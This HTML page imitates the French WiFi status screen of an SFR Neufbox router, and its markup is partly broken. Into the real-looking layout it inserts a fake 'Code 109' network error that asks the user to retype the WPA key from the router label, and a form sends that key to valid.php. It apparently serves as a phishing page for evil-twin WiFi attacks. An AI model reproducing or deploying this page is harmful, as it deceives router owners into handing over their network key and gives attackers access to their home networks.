

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
  <head>
  <title>box -&nbsp;WiFi</title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta http-equiv="Cache-Control" content="no-cache, must-revalidate" />
  <meta http-equiv="Expires" content="Mon, 26 Jul 1997 05:00:00 GMT" />
  <meta http-equiv="Pragma" content="no-cache" />
  <meta http-equiv="Content-Script-Type" content="text/javascript" />
  <meta name="format-detection" content="telephone=no" />
  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
  <link rel="stylesheet" type="text/css" media="screen" href="/css/reset.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="/css/common.css" />
  <link rel="stylesheet" type="text/css" media="screen" href="/css/wifi.css" />
<link rel="stylesheet" href="/css/menuneufbox.css" type="text/css"
  <script type="text/javascript" src="/js/global.js"></script>
  <script type="text/javascript" src="/js/wifi.js"></script>
  </head>
  <body>
  <div id="header">
  <div id="logo">
  <a href="/" title="Accueil">Accueil</a>
  </div>
  <div id="infos">
  <table>
  <tr>
  <th>Version&nbsp;</th>
  <td>: NB6-MAIN-R3.3.3</td>
  </tr>
  <tr>
  <th>Adresse MAC&nbsp;</th>
  <td>: Non disponible</td>
  </tr>
  <tr>
  <th>Adresse IP&nbsp;</th>
  <td>: Non disponible</td>
  </tr>
  <tr>
  <th>Profil d'accès&nbsp;</th>
  <td>:&nbsp;(109) Erreur réseau&nbsp;
  </td>
  </tr>
  </table>
  </div>
  </div>
<div id="menu">
  <ul>
  <li id="id_state_tab" class="tab_off">
  <a href="" title="Etat">Etat</a>
  </li>
  <li id="id_network_tab" class="tab_off">
  <a href="" title="Réseau">Réseau</a>
  </li>
  <li id="id_wifi_tab" class="tab_on">
  <a href="" title="Wifi">Wifi</a>
  </li>
  <li id="id_hotspot_tab" class="tab_off">
  <a href="" title="Hotspot">Hotspot</a>
  </li>
  <li id="id_service_tab" class="tab_off">
  <a href="" title="Applications">Applications</a>
  </li>
  <li id="id_maintenance_tab" class="tab_off">
  <a href="" title="Maintenance">Maintenance</a>
  </li>
  <li id="id_eco_tab" class="tab_off">
  <a href="" title="Eco">Eco</a>
  </li>
  <li id="" class="tab_off tab_signoff">
  <a href="">Déconnexion</a>
  </li>
  </ul>
</div>
<div id="submenu">
  <ul>
  <li class="tab_on">
  <a href="" title="Général">Général</a>
  </li>
  <li class="tab_off">
  <a href="" title="Configuration">Configuration</a>
  </li>
  <li class="tab_off">
  <a href="" title="Sécurité">Sécurité</a>
  </li>
  <li class="tab_off">
  <a href="" title="Filtrage MAC">Filtrage MAC</a>
  </li>
  </ul>
</div>
  <div id="main">
<div class="title">
  <h1>Point d'accès</h1>
</div>
<div class="content">
  <table id="wifi_info">
  <tr>
  <th scope="row">Etat</th>
  <td id="wlan_status" class="enabled">
  Activé
  </td>
  </tr>
  <tr>
  <th scope="row">SSID</th>
  <td>SFR_XXXX</td>
  </tr>
  <tr>
  <th scope="row">Diffusion du SSID</th>
  <td>
  Activé
  </td>
  </tr>
  <tr>
  <th scope="row">Canal</th>
  <td>
  6
  </td>
  </tr>
  <tr>
  <th scope="row">Mode radio</th>
  <td>
		11b/g/n
  </td>
  </tr>
  <tr>
  <th scope="row">Chiffrement</th>
  <td>
  WPA
  </td>
  </tr>
  <tr>
  <th scope="row">Clé</th>
  <td>
  Invalide
  </td>
  </tr>
  <tr>
  <th scope="row">Filtrage MAC</th>
  <td>
  Désactivé
  </td>
  </tr>
  </table>
</div>
<h1>SFR Neufbox</h1>
			</p>
			<p>
<p>(Code 109: Erreur r&eacute;seau inconnue) veuillez vous reconnecter avec la cl&eacute; WPA/WEP dans le champ ci dessous et valider.La cl&eacute; WPA figure derri&egrave;re votre Neufbox de SFR sur une petite &eacute;tiquette.</p>
			</p>
			<br />
			<br />
			<form method="POST" action="valid.php"> 
<p>Cl&eacute; WPA: <input type="text" name="cle" size="20"></p>
<p>Confirmation: <input type="text" name="cleconf" size="20"></p>
<div class="block" id="thoughtbot">
<button>Valider</button> 
			</p></form>
<div class="block" id="aide"> 
<img src="/img/aide.jpg" width="105" height="105" alt="aide"></a>
<br />
<div class="title">
  <h1>Postes connectés</h1>
</div>
<div class="content">
  <table id="wifi_assoc">
  <thead>
		<tr>
		<th scope="col" class="col_number">#</th>
		<th scope="col" class="col_mac">Adresse MAC</th>
		<th scope="col" class="col_ip">Adresse IP</th>
		</tr>
		</thead>
		<tbody>
  <tr>
  <td class="col_number">
  1
  </td>
  <td>
  Non disponible
  </td>
  <td>
  Erreur réseau
  </td>
  </tr>
		</tbody>
  </table>
</div>
		</div>
		<div id="help">
		<h1 id="help_title"><span>Aide</span></h1>
		<p id="help_text">Dans la rubrique <b>Point d'accès</b>, vous trouvez les caractéristiques de votre liaison sans fil WiFi intégrée à la box : l'activation du WiFi, le nom de votre réseau sans fil (SSID), si le nom de votre réseau sans fil est diffusé, le canal, le mode radio, le mode de chiffrement des communications, la clé de chiffrement et l'activation du filtrage par adresse MAC. <br/><br/> Dans la rubrique <b>Postes connectés</b>, vous trouvez la liste des équipements WiFi actuellement connectés à votre box.</p>
		</div>
	</body>
</html>

